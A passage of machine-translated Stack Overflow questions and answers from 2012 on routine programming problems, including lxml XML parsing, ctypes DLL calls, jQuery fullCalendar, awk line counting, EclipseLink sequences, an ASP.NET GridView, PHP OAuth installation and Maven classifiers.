                if elem3.tag == 'ComponentID':
                    asset['CompID'+str(temp)] = elem3.text
                if elem3.tag == 'ComponentName':
                    asset['CompName'+str(temp)] = elem3.text
                if elem3.tag == 'Description':
                    asset['Description'+str(temp)] = elem3.text
            temp+=1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:08:31.627

以下是一些可能对您有所帮助的提示：

*   使用[enumerate](http://docs.python.org/2/library/functions.html#enumerate)为您计算`<Component>`元素。
*   使用dict 在标签（例如）和所需的结果键（例如）`keyname`之间进行映射`ComponentID``CompID`

* * *

例如，使用[lxml](http://codespeak.net/lxml/)，使用以下设置：

```
import lxml.etree as ET
import pprint

content = '''
<Components>
    <Component>
        <ComponentID>B1</ComponentID>
        <ComponentName>replace</ComponentName>
        <Description>replace</Description>
    </Component>
    <Component>
        <ComponentID>D2</ComponentID>
        <ComponentName>Red</ComponentName>
        <Description>Red</Description>
    </Component>
    <Component>
        <ComponentID>D3</ComponentID>
        <ComponentName>Yellow</ComponentName>
        <Description>Yellow</Description>
    </Component>
</Components>
''' 
```

编码：

```
keyname = {'ComponentID' : 'CompID',
           'ComponentName': 'CompName'}
result = {}
doc = ET.fromstring(content)
for i, component in enumerate(doc.xpath('Component'), 1):
    for node in component:
        key = '{t}{i}'.format(t = keyname.get(node.tag, node.tag), i = i)
        result[key] = node.text
pprint.pprint(result) 
```

产量

```
{'CompID1': 'B1',
 'CompID2': 'D2',
 'CompID3': 'D3',
 'CompName1': 'replace',
 'CompName2': 'Red',
 'CompName3': 'Yellow',
 'Description1': 'replace',
 'Description2': 'Red',
 'Description3': 'Yellow'} 
```

# python - 将 args 传递给 DLL 函数调用的过程没有足够的参数（缺少 20 个字节）

> ID：13822387
> 
> 赞同：3
> 
> 时间：2012-12-11T14:57:13.187
> 
> 标签：python, dll, ctypes

我正在尝试使用 ctypes 调用 dll 函数并出现错误。如何获得有关我的电话有什么问题的更多信息？

dll函数头：

```
DLL_API BOOL WINAPI DDSSetFrequency(int index, double frequency, int* wavePointNum, int* TNum); 
```

蟒蛇代码

```
from ctypes import *

hantek = cdll.LoadLibrary("E:\Programmer's Guide\DLL\DDS3X25Dll.dll")
print hantek.DDSSearch()

wavePointNum = c_int()
Tnum = c_int()
frequency = c_double(10000000.0)
index = c_int32(1)

hantek.DDSSetFrequency(index,frequency,byref(wavePointNum),byref(Tnum))

1
Traceback (most recent call last):
  File "3x25.py", line 17, in <module>
    hantek.DDSSetFrequency(index,frequency,byref(wavePointNum),byref(Tnum))
ValueError: Procedure called with not enough arguments (20 bytes missing) or wro
ng calling convention 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-26T18:29:30.597

你可能还没有在这个项目上工作，但如果你是（为了后代的缘故），我提供了一个指向我为 HT1025G 编写[的 python 包装器的链接，它演示了一个工作界面。](https://github.com/AIMAtlanta/Hantek_1025G)该`set_frequency`方法有点挑剔，我发现（未记录的）`set_divisor`方法更好。

# windows-8 - Windows 8 应用更新

> ID：13822393
> 
> 赞同：2
> 
> 时间：2012-12-11T14:57:28.837
> 
> 标签：windows-8

我想为已在 Windows 应用商店中的应用发布更新。当我创建新版本时，是否需要删除旧包，或者必须将新包添加到列表中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:51:35.543

任何时候您都只能在商店中发布一个应用程序版本。这意味着一旦新版本获得认证，它就会有效地覆盖旧版本。这不一定与软件包直接相关，因为如果您愿意，您可以使用相同的软件包创建一个新版本（尽管您必须更改某些内容，否则它不会让您重新提交）。

# jquery - jquery fullcalendar 打开多个日历

> ID：13822394
> 
> 赞同：0
> 
> 时间：2012-12-11T14:57:28.897
> 
> 标签：jquery, fullcalendar

我刚刚开始使用 jQuery fullcalendar [http://arshaw.com/fullcalendar/](http://arshaw.com/fullcalendar/)，我遇到了一个奇怪的问题。我从点击功能启动日历，第一次打开日历时它很好并打开了 1 个日历。但是，如果我再次单击，它会添加 1，我现在有 2 个日历。每次我单击它时都会发生这种情况，它每次都会添加 1 个日历。是否有一些我必须添加的选项来重新初始化日历。我能看到的唯一选项是“渲染”选项，但无法弄清楚如何使用它。谢谢

**更新**：新代码更新

```
$(function() {
    $('#calhead1').on("click", function(){

        $("#msgcontent, #msgcontent2, #main, #msgtest").hide(1000);
        $("#cal").show();
    });
});
    // Start Calendar Script //

    $(function() {

            var date = new Date();
            var d = date.getDate();
            var m = date.getMonth();
            var y = date.getFullYear();

            $('#cal').fullCalendar({

                header: {
                    left: 'prev,next today',
                    center: 'title',
                    right: 'month,basicWeek,basicDay'
                },
                editable: true,
                theme: true,
                width: 760,
                height: 470,
                events: [
                    {
                        title: 'All Day Event',
                        start: new Date(y, m, 1)
                    },
                    {
                        title: 'Long Event',
                        start: new Date(y, m, d-5),
                        end: new Date(y, m, d-2)
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: new Date(y, m, d-3, 16, 0),
                        allDay: false
                    },
                    {
                        id: 999,
                        title: 'Repeating Event',
                        start: new Date(y, m, d+4, 16, 0),
                        allDay: false
                    },
                    {
                        title: 'Meeting',
                        start: new Date(y, m, d, 10, 30),
                        allDay: false
                    },
                    {
                        title: 'Lunch',
                        start: new Date(y, m, d, 12, 0),
                        end: new Date(y, m, d, 14, 0),
                        allDay: false
                    },
                    {
                        title: 'Birthday Party',
                        start: new Date(y, m, d+1, 19, 0),
                        end: new Date(y, m, d+1, 22, 30),
                        allDay: false
                    },
                    {
                        title: 'Click for Google',
                        start: new Date(y, m, 28),
                        end: new Date(y, m, 29),
                        url: 'http://google.com/'
                    }
                ]
            });

            });

    // End Calendar Script // 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:04:26.127

1.  jQuery live-function 已被弃用，使用 .on()
2.  在点击事件之外初始化您的日历，并在点击时显示和隐藏它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:13:18.230

调用该`fullCalendar`函数旨在创建一个新日历，以便您的脚本完全按照预期执行。您只需将该功能移到您的点击事件处理程序之外。

我还建议`live`从新`on`方法转移到 jQuery 现已弃用`live`。

您的新代码如下所示：

```
$(function() {

    $('#cal').fullCalendar({

        header: {
            left: 'prev,next today',
            center: 'title',
            right: 'month,basicWeek,basicDay'
        },
        editable: true,
        theme: true,
        width: 760,
        height: 470,
        events: [
            {
                title: 'All Day Event',
                start: new Date(y, m, 1)
            },
            {
                title: 'Long Event',
                start: new Date(y, m, d-5),
                end: new Date(y, m, d-2)
            },
            {
                id: 999,
                title: 'Repeating Event',
                start: new Date(y, m, d-3, 16, 0),
                allDay: false
            },
            {
                id: 999,
                title: 'Repeating Event',
                start: new Date(y, m, d+4, 16, 0),
                allDay: false
            },
            {
                title: 'Meeting',
                start: new Date(y, m, d, 10, 30),
                allDay: false
            },
            {
                title: 'Lunch',
                start: new Date(y, m, d, 12, 0),
                end: new Date(y, m, d, 14, 0),
                allDay: false
            },
            {
                title: 'Birthday Party',
                start: new Date(y, m, d+1, 19, 0),
                end: new Date(y, m, d+1, 22, 30),
                allDay: false
            },
            {
                title: 'Click for Google',
                start: new Date(y, m, 28),
                end: new Date(y, m, 29),
                url: 'http://google.com/'
            }
        ]
    });
    $('#calhead1').on("click", function(){

                    $("#msgcontent, #msgcontent2, #main, #msgtest").hide(1000);
                    $("#cal").show();
                    var date = new Date();
                    var d = date.getDate();
                    var m = date.getMonth();
                    var y = date.getFullYear();
    });

}); 
```

# sed - 基于文件中第一个字段的唯一行数

> ID：13822397
> 
> 赞同：2
> 
> 时间：2012-12-11T14:57:34.223
> 
> 标签：sed, awk, uniq

我正在尝试根据第一个字段计算输出到文件的唯一行数，其中输入行如下所示：

```
Forms.js     /forms/Forms.js     http://www.gumby.com/test.htm   404
Forms.js     /forms/Forms1.js    http://www.gumby.com/test.htm   404
Forms.js     /forms/Forms2.js    http://www.gumby.com/test.htm   404
Interpret.js     /forms/Interpret1.js    http://www.gumby.com/test.htm   404    
Interpret.js     /forms/Interpret2.js    http://www.gumby.com/test.htm   404
Interpret.js     /forms/Interpret3.js    http://www.gumby.com/test.htm   404 
```

对于这样的事情：

```
3    Forms.js    /forms/Forms.js     http://www.gumby.com.mx/test.htm 404
3    Interpret.js    /forms/Interpret.js    http://www.gumby.com.mx/test.htm  404 
```

我一直在尝试 sort 和 uniq 的各种组合，但还没有实现。我可以使用整行获得不同的行，但我只想要第一个字段。我目前正在使用cygwin。我不识字，但我怀疑这是要走的路。任何人有一个方便的解决方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:12:08.790

这个：

```
<infile awk '{ h[$1]++ } END { for(k in h) print h[k], k }' 
```

会给你：

```
3 Forms.js
3 Interpret.js 
```

如果您还想保持第一次命中，请使用：

```
awk '!h[$1] { g[$1]=$0 } { h[$1]++ } END { for(k in g) print h[k], g[k] }' 
```

输出：

```
3 Forms.js /forms/Forms.js http://www.gumby.com/test.htm 404
3 Interpret.js /forms/Interpret1.js http://www.gumby.com/test.htm 404 
```

用 GNU awk 测试。

请注意，这不需要对输入进行排序。另请注意，结果是无序的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:04:37.103

`Awk`是这个工具，但如果你想聪明一点`uniq`：

```
$ column -t file | uniq -w12 -c
      3 Forms.js      /forms/Forms.js       http://www.gumby.com/test.htm  404
      3 Interpret.js  /forms/Interpret1.js  http://www.gumby.com/test.htm  404 
```

`column -t`对齐所有列，因此我们得到第一列的固定宽度。

* * *

或者，如果不可用，则*hack*是将第一列附加到行尾，然后用于计算最后一列的唯一性并再次用于打印字段。`column``awk``uniq -c -f4``awk``n-1`

```
$ awk '{print $0, $1}' file | uniq -c -f4 | awk '{$NF=""; NF--; print}'
3 Forms.js /forms/Forms.js http://www.gumby.com/test.htm 404
3 Interpret.js /forms/Interpret1.js http://www.gumby.com/test.htm 404 
```

`uniq -f`如果像`-f4,4`or一样工作会很好`f1,1`。

* * *

或者您可以使用`rev`来反转文件，以便`uniq -c -f3`可以完成然后`rev`返回*（但是最后会得到计数，如果没有，则`column`可能没有`rev`）*

```
$ rev file | uniq -c -f3 | rev
Forms.js /forms/Forms.js http://www.gumby.com/test.htm 404 3      
Interpret.js /forms/Interpret1.js http://www.gumby.com/test.htm 404 3 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T16:57:38.883

```
$ awk '!c[$1]++{v[$1]=$0} END{for (i in c) print c[i],v[i]}' file
3 Forms.js     /forms/Forms.js     http://www.gumby.com/test.htm   404
3 Interpret.js     /forms/Interpret1.js    http://www.gumby.com/test.htm   404 
```

上面使用 '!array[$n]++' 的常见 awk 习惯用法来判断一个键值（$n，其中 n 是 $0 或 $1 或 $4,$5 或 ...）是否曾见过。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T15:59:29.963

假设`file.txt`包含您的示例输入：

```
sort file.txt | awk -f counts.awk file 
```

返回：

```
3:Forms.js     /forms/Forms.js     http://www.gumby.com/test.htm   404
3:Interpret.js     /forms/Interpret1.js    http://www.gumby.com/test.htm   404 
```

awk 脚本文件：

```
cat counts.awk

#  output format is:
#+ TimesFirstFieldIsRepeated:FirstMatchingLineContents

BEGIN {

  plmatch="";
  pline="";
  outline="";
  n=1;

 }

{

 if($1 != plmatch && NR != 1)
  {
   print n ":" outline;
   n=1;
   outline="";
  }

 if($1 == plmatch)
  {
   n+=1;
   if(outline == ""){
     outline=pline;
    }
  }

 plmatch=$1;
 pline=$0;

}

END {
  print n ":" outline;
 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-11T15:11:39.490

我只是`cut -f 1 | uniq -c`。这不会给你整行，但如果行不同，打印任何行无论如何都没有太大意义。取决于你想要达到什么。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-11T15:11:49.290

您可以计算第一个字段的数量，`cut`但您想在该字段之后打印什么？

```
cat file | cut -d " " -f 1 | uniq -c 
```

# caching - 生成的序列未填充到 EJB 中

> ID：13822404
> 
> 赞同：0
> 
> 时间：2012-12-11T14:57:13.830
> 
> 标签：caching, jpa, eclipselink, sequence, persist

我有一个使用 Eclipselink 2.4.0 的应用程序，我已经开始使用生成的代理键。我的 EJB 注释如下所示：

```
@Id
@GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "reformatFileId")
@SequenceGenerator(name = "reformatFileId", sequenceName = "REFORMAT_FILE_ID_SEQ", allocationSize = 1)
@Basic(optional = false)
@NotNull
@Column(name = "FILE_ID")
private Long fileId; 
```

在实例化 EJB 后，我持久化 EJB 的逻辑如下所示：

```
 try {
        EntityManager em = getEntityManager();
        em.persist(entity);
        em.flush();
    } catch (ConstraintViolationException ex) {
        for (ConstraintViolation cv : ex.getConstraintViolations())
            LOGGER.log(Level.SEVERE, "Constraint violation persisting {0}: {1}", new Object[]{entity.getClass(), cv.getMessage()});
        throw ex;
    } 
```

创建对象时，我需要立即获取 fileId 值，以便可以在使用 fileId 作为外键的子表中创建记录。但是，我发现 fileId 值仍然为空。

我尝试了一个简单的解决方法，丢弃原始对象并查询一个新对象（基于 fileId 是代理键的列的唯一组合），我认为我必须得到一个缓存对象，因为我' m 仍然得到一个具有空 fileId 的 EJB 实例。

我已经尝试更新到 Eclipselink 2.4.1，以防这是 ​​JPA 错误，但这并没有帮助。

我也尝试在我的提交逻辑中添加对 em.refresh(entity) 的调用，但我的理解是刷新作用于主键，所以可以理解的是，这并没有解决问题。

我目前正在研究使该对象的缓存无效，然后重新加载它，但这似乎是一个可怕的问题。根据我对 JPA 的了解，这应该可以按我的预期工作。

任何建议将不胜感激。

史蒂夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:58:23.643

EclipseLink 将在persist() 调用上分配id 值以生成SEQUENCE。对于 IDENTITY 生成，在刷新或提交之前无法分配。

您应该在持久调用后看到该值。你有任何错误吗？您有一个 @NotNull 验证约束，这可能会导致错误。尝试在持久调用之后打印 id 的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T15:18:13.620

我最终不得不对提交对象进行暴力解决，然后从头开始重新实例化它。它不漂亮，但它有效。我仍然无法解释为什么它不尊重 JPA 生成序列的记录行为。这可能是 EclipseLink 2.4.0 中的一个错误，但我还没有验证这一点。

# asp.net - Gridview 中的更新命令停止工作（以前工作和删除，选择工作正常）

> ID：13822405
> 
> 赞同：1
> 
> 时间：2012-12-11T14:57:51.913
> 
> 标签：asp.net, vb.net, ms-access, gridview

我有一个使用具有选择、插入、删除和更新功能的 accessdatasource 的 gridview。它曾经完美地工作，但突然间更新停止工作，而其余部分仍在按预期工作。我没有更改 gridview 或数据源中的任何内容，但我向表中添加了新字段但未显示在 gridview 中。我通过从表中删除也不起作用的新字段进行测试。也刷新了数据源和网格视图。这是代码

```
asp:GridView ID="GridView1" runat="server" AllowSorting="True" 
              ShowFooter="True" EmptyDataText="There are no records for the selection"  
              AutoGenerateColumns="False" CellPadding="4"  OnRowCommand="Insert_Click" 
              OnRowUpdating="beforeUpdate"           
              DataKeyNames="Lab Name,Target,Device Name" 
              ForeColor="#333333" HorizontalAlign="Center" 
              EmptyDataRowStyle-HorizontalAlign="Center" 
              EmptyDataRowStyle-VerticalAlign="Middle" Width="1333px" 
              DataSourceID="AccessDataSource8">
              <RowStyle BackColor="#F7F6F3" ForeColor="#333333" />
              <EmptyDataRowStyle Wrap="False" /> 
              <Columns>
                  <asp:TemplateField ShowHeader="False">
                      <EditItemTemplate>
                          <asp:LinkButton ID="LinkButton1" runat="server" CausesValidation="True" 
                              CommandName="Update" Text="Update"></asp:LinkButton>
                          &nbsp;<asp:LinkButton ID="LinkButton2" runat="server" CausesValidation="False" 
                              CommandName="Cancel" Text="Cancel"></asp:LinkButton>
                      </EditItemTemplate>
                      <ItemTemplate>
                          <asp:LinkButton ID="LinkButton1" runat="server" CausesValidation="False" 
                              CommandName="Edit" Text="Edit"></asp:LinkButton>
                          &nbsp;<asp:LinkButton ID="LinkButton2" runat="server" CausesValidation="False" 
                              CommandName="Delete" Text="Delete" OnClientClick="return confirm('Are you sure?');" ></asp:LinkButton>
                      </ItemTemplate>
                      <FooterTemplate>
                     <asp:LinkButton ID="LinkButton" runat="server" CommandName="Insert" Text="Insert" ValidationGroup="validate" ></asp:LinkButton>
                     </FooterTemplate>
                  </asp:TemplateField>

                  <asp:TemplateField HeaderText="Lab Name" SortExpression="Lab Name">
                      <ItemTemplate>
                          <asp:Label ID="Label1" runat="server" Text='<%# Bind("[Lab Name]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:Label ID="Label1" runat="server" Text='<%# Eval("[Lab Name]") %>'></asp:Label>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtLabname" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="LabName" runat="server" ControlToValidate="txtLabname" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="Target" SortExpression="Target">
                      <ItemTemplate>
                          <asp:Label ID="Label2" runat="server" Text='<%# Bind("Target") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:Label ID="Label2" runat="server" Text='<%# Eval("Target") %>'></asp:Label>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtTarget" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Target" runat="server" ControlToValidate="txtTarget" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="Device Name" SortExpression="Device Name">
                      <ItemTemplate>
                          <asp:Label ID="Label3" runat="server" Text='<%# Bind("[Device Name]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:Label ID="Label3" runat="server" Text='<%# Eval("[Device Name]") %>'></asp:Label>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtDevicename" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Devicename" runat="server" ControlToValidate="txtDevicename" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="IO Type Requirement" 
                      SortExpression="IO Type Requirement">
                      <ItemTemplate>
                          <asp:Label ID="Label4" runat="server" 
                              Text='<%# Bind("[IO Type Requirement]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:TextBox ID="TextBox1" runat="server" 
                              Text='<%# Bind("[IO Type Requirement]") %>'></asp:TextBox>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtIotyperequirement" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Iotyperequirement" runat="server" ControlToValidate="txtIotyperequirement" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="Part Number" SortExpression="Part Number">
                      <ItemTemplate>
                          <asp:Label ID="Label5" runat="server" Text='<%# Bind("[Part Number]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:TextBox ID="TextBox2" runat="server" Text='<%# Bind("[Part Number]") %>'></asp:TextBox>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtPartnumber" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Partnumber" runat="server" ControlToValidate="txtPartnumber" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="Sub Part" SortExpression="Sub Part">
                      <ItemTemplate>
                          <asp:Label ID="Label6" runat="server" Text='<%# Bind("[Sub Part]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:TextBox ID="TextBox3" runat="server" Text='<%# Bind("[Sub Part]") %>'></asp:TextBox>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtSubpart" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Subpart" runat="server" ControlToValidate="txtSubpart" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
                  <asp:TemplateField HeaderText="Subpart Description" 
                      SortExpression="Subpart Description">
                      <ItemTemplate>
                          <asp:Label ID="Label7" runat="server" 
                              Text='<%# Bind("[Subpart Description]") %>'></asp:Label>
                      </ItemTemplate>
                      <EditItemTemplate>
                          <asp:TextBox ID="TextBox4" runat="server" 
                              Text='<%# Bind("[Subpart Description]") %>'></asp:TextBox>
                      </EditItemTemplate>
                      <FooterTemplate>
                          <asp:TextBox ID="txtSubpartdesc" runat="server" ></asp:TextBox>
                          <asp:RequiredFieldValidator ID="Subpartdesc" runat="server" ControlToValidate="txtSubpartdesc" Text="*" ValidationGroup="validate"/>
                      </FooterTemplate>
                  </asp:TemplateField>
              </Columns>
              <FooterStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
              <PagerStyle BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
              <SelectedRowStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
              <HeaderStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
              <EditRowStyle BackColor="#999999" VerticalAlign="Middle" Wrap="False" />
              <AlternatingRowStyle BackColor="White" ForeColor="#284775" 
                  VerticalAlign="Middle" Wrap="False" />
          </asp:GridView> 

<asp:AccessDataSource ID="AccessDataSource8" runat="server" CancelSelectOnNullParameter="False" 
                DataFile="~/App_Data/Test.mdb"
                 SelectCommand="SELECT Lab1.[Lab Name], Lab1.[Target], Lab1.[Device Name], Lab1.[IO Type Requirement], Lab1.[Part Number], Lab1.[Sub Part], Lab1.[Subpart Description]
            FROM Lab1 
        WHERE      
         (((Lab1.[Lab Name])= [WhichLab] OR [WhichLab] = '0') AND
        ((Lab1.[Target])= [WhichTarget] OR [WhichTarget] = '0') AND
        ((Lab1.[Device Name])= [WhichDevice] OR [WhichDevice] = '0') AND
        ((Lab1.[IO Type Requirement])= [Whichiotyperequirement] OR [Whichiotyperequirement] = '0') AND
        ((Lab1.[Part Number])= [WhichPartNumber] OR [WhichPartNumber] = '0') AND
        ((Lab1.[Sub Part])= [WhichSubPart] OR [WhichSubPart] = '0') AND
        ((Lab1.[Subpart Description])= [WhichSubPartDesc] OR [WhichSubPartDesc] = '0')
         )" UpdateCommand= " UPDATE  [Lab1] SET  [IO Type Requirement]= ?, [Part Number]= ?, [Sub Part]= ?, [Subpart Description]= ? 
            WHERE ([Lab Name]= ?) AND ([Target]= ?) AND ([Device Name] = ?)"

              InsertCommand= "INSERT INTO LAB1 ([Lab Name],[Target],[Device Name],[IO Type Requirement],[Part Number],[Sub Part],[Subpart Description]) VALUES 
            ([WhichLab],[WhichTarget],[WhichDevice],[Whichiotyperequirement],[WhichPartNumber],[WhichSubPart],[WhichSubPartDesc]) "

            DeleteCommand= " Delete from LAB1 WHERE LAB1.[Lab Name]= [WhichLab] AND Lab1.[Target]=[WhichTarget] AND Lab1.[Device Name]=[WhichDevice]">

                <SelectParameters>
                    <asp:ControlParameter ControlID="DropDownList1" Name="Lab Name" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList2" Name="Target" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList3" Name="Device Name" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList4" Name="IO Type Requirement" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList5" Name="Part Number" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList6" Name="Sub Part" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />
                    <asp:ControlParameter ControlID="DropDownList7" Name="Subpart Description" ConvertEmptyStringToNull="true"  PropertyName="SelectedValue" />                                                                    
                </SelectParameters>

                <UpdateParameters>

                    <asp:Parameter  Name="IO Type Requirement"  Type="String"/>
                    <asp:Parameter  Name="Part Number"  Type="String"/>
                    <asp:Parameter  Name="Sub Part" Type="String" />
                    <asp:Parameter  Name="Subpart Description"  Type="String"/>
                    <asp:Parameter  Name="Lab Name"  Type="String"/>
                    <asp:Parameter  Name="Target" Type="String"/>
                    <asp:Parameter  Name="Device Name"  Type="String"/>

                </UpdateParameters>

                <InsertParameters>
                    <asp:Parameter Name="Lab Name" Type="String" />
                    <asp:Parameter Name="Target" Type="String" />
                    <asp:Parameter Name="Device Name" Type="String" />
                    <asp:Parameter Name="IO Type Requirement" Type="String" />
                    <asp:Parameter Name="Part Number" Type="String" />
                    <asp:Parameter Name="Sub Part" Type="String" />
                    <asp:Parameter Name="Subpart Description" Type="String" />
                </InsertParameters>
                <DeleteParameters>
                    <asp:Parameter Name="Lab Name" Type="String" />
                     <asp:Parameter Name="Target" Type="String" />
                    <asp:Parameter Name="Device Name" Type="String" />

                </DeleteParameters>
            </asp:AccessDataSource> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:18:54.903

WHERE 子句中的字段之一：

```
WHERE ([Lab Name]= ?) AND ([Target]= ?) AND ([Device Name] = ?)" 
```

...不匹配记录。可能在一个或多个字段中有尾随空格。

`"ABC"`不匹配 `"ABC "`

# php - 致命错误：未找到类“OAuth”

> ID：13822406
> 
> 赞同：11
> 
> 时间：2012-12-11T14:57:51.677
> 
> 标签：php

我正在尝试连接到 LinkedIn API，但每次尝试访问它时都会出现以下错误：

> 致命错误：在第 8 行的 /home/vhosts/ *** /test.php 中找不到类“OAuth”

我在 000WebHost 上使用免费服务器，并且我读到免费服务器有时不支持 OAuth。我已经在另一台免费服务器上尝试过，并且收到相同的错误消息，所以我的问题是如何检查服务器是否支持使用 OAuth？

这是我的代码：

```
// Fill the keys and secrets you retrieved after registering your app
$oauth = new OAuth("abcd123456", "efgh987654");
$oauth->setToken("abcd1234-efgh987-9988", "9876abcd-123asdf-1122");

$params = array();
$headers = array();
$method = OAUTH_HTTP_METHOD_GET;

// Specify LinkedIn API endpoint to retrieve your own profile
$url = "http://api.linkedin.com/v1/people/~";

// By default, the LinkedIn API responses are in XML format. If you prefer JSON, simply       specify the format in your call
// $url = "http://api.linkedin.com/v1/people/~?format=json";

// Make call to LinkedIn to retrieve your own profile
$oauth->fetch($url, $params, $method, $headers);

echo $oauth->getLastResponse(); 
```

键被替换为 LikedIn 开发人员入门指南中的键。

预先感谢您的帮助。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-11T15:11:35.603

OAuth 是一个 PECL 扩展，它必须编译成 PHP 或编译为扩展。

*   [http://us3.php.net/manual/en/oauth.installation.php](http://us3.php.net/manual/en/oauth.installation.php)
*   [http://pecl.php.net/package/oauth](http://pecl.php.net/package/oauth)

大多数服务器默认情况下不会有它，因为它确实不是每个人都可能使用的东西。如果像我一样使用 CGI，您可以要求您的主机安装它，或者如果您有能力在服务器上编译它。如果你运行 phpinfo(); 并寻找 OAuth 这个词，如果你有它就会出现，否则你没有。

* * *

**更新：**使用[https://github.com/Lusitanian/PHPoAuthLib](https://github.com/Lusitanian/PHPoAuthLib)而不是 PECL。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-05-14T18:51:50.030

我使用 hostgator 进行托管并且遇到了这个问题，所以如果您的主机也使用 cpanel，您应该能够做我所做的事情。

从文件管理器中的活动目录向上转到 1 个目录，您可以在其中看到“public_html, www, tmp”。（或单击左侧的主文件夹图标），您应该在其中找到一个 php.ini 文件。编辑添加`extension=oauth.so`到最后的文件并保存。

之后检查 phpinfo()，您应该会找到一个名为“OAuth”的部分，并且一切正常。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-12-06T17:13:21.567

```
sudo apt-get update
sudo apt-get install php-oauth
sudo service apache2 restart 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-11-28T07:32:33.873

对于 php 5.6... 首先声明：您需要尽快迁移到最新的稳定版 php 7，而*不是*运行 php 5.6！但如果这还不太可能，这可能会对 Ubuntu 16.04 用户有所帮助。这假设您有 ondrej/php ppa。

```
sudo apt-get update
sudo apt-get install libpcre3-dev
sudo apt-get install php-pear            # * see note below 
sudo apt-get install php5.6-dev          # for phpize
sudo pecl install oauth-1.2.3

# now add "extension=oauth.so" (sans quotes) to the 
# "Dynamic Extensions" area in /etc/php/5.6/apache2/php.ini 
```

* 根据这篇文章 [https://askubuntu.com/a/756186/343695](https://askubuntu.com/a/756186/343695) “php-pear pull[s] 只是 CLI PHP 7.0 (php7.0-cli)，这是无害的”该评论是在 2016 年发表的，可能不再是真的。我还没有看到任何问题。

# java - maven 命名约定 32 vs 64 位和 windows vs linux

> ID：13822407
> 
> 赞同：5
> 
> 时间：2012-12-11T14:57:22.363
> 
> 标签：java, maven, dependencies

我有一个有 4 个不同版本的库：32 和 64 位 Windows 以及 32 和 64 位 linux。在将它们上传到 Maven 存储库时，我试图弄清楚每个库的名称。现在我有：

```
 <!--windows 32bit -->
  <groupId>com.lib-name.win</groupId>
  <artifactId>lib-name</artifactId>
  <classifier>x86<classifier>
  <version>10</version>

  <!--windows 64bit -->
  <groupId>com.lib-name.win</groupId>
  <artifactId>lib-name</artifactId>
  <classifier>x86-64<classifier>
  <version>10</version>

  <!--linux 32bit -->
  <groupId>com.lib-name.nix</groupId>
  <artifactId>lib-name</artifactId>
  <classifier>x86<classifier>
  <version>10</version>

  <!--linux 64bit -->
  <groupId>com.lib-name.nix</groupId>
  <artifactId>lib-name</artifactId>
  <classifier>x86-64<classifier>
  <version>10</version> 
```

